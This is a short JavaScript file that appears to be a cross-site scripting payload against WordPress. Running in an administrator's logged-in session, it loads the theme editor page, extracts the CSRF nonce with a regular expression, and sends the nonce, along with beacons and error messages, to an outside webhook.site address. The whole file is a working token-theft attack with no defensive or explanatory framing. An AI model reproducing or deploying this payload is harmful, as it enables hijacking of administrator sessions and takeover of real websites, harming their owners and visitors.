
async function caller(){
	try{
		await fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?estw');
		console.log('calling');
		const res = await fetch('/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
		console.log(res);
		
		const kek = await fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?' + res[1]);
	}catch(err){
		await fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+err);
	}
		
}


caller();

